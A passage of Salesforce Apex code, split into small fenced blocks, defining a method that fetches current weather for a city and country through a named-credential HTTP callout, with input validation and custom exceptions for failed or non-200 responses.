* @param country The name or code of the country (e.g., "UK" or "United Kingdom").
* @return A JSON string representing the current weather conditions.
* @throws WeatherServiceException If the HTTP callout fails, returns a non-200 status,
```

```apex
* or if there's an issue parsing the response.
* @see <a href="https://example.com/weather-api-docs/current-conditions.html">External
```

```apex
* Weather API</a>
*/
public static String getCurrentWeather(
```

```apex
String city,
String country
) {
```

```apex
if (String.isBlank(city) || String.isBlank(country)) {
```

```apex
throw new WeatherServiceException(
```

```apex
'City and country cannot be blank for weather lookup.'
);
}
```

```apex
String namedCredentialUrl = 'callout:WeatherAPI/current';
String requestParams =
```

```apex
'?city=' +
EncodingUtil.urlEncode(city, 'UTF-8') +
'&country=' +
EncodingUtil.urlEncode(country, 'UTF-8');
```

```apex
HttpRequest req = new HttpRequest();
req.setEndpoint(namedCredentialUrl + requestParams);
req.setMethod('GET');
req.setTimeout(60000);
```

```apex
Http http = new Http();
HttpResponse res;
```

```apex
try {
res = http.send(req);
} catch (System.CalloutException e) {
```

```apex
throw new WeatherServiceException(
```

```apex
'HTTP Callout Failed: ' + e.getMessage()
);
}
```

```apex
if (res.getStatusCode() == 200) {
```

```apex
return res.getBody();
} else {
```

```apex
throw new WeatherServiceException(
```

```apex
'Failed to retrieve weather data. Status: ' +
res.getStatusCode() +
'. Details: ' +
res.getBody()
```
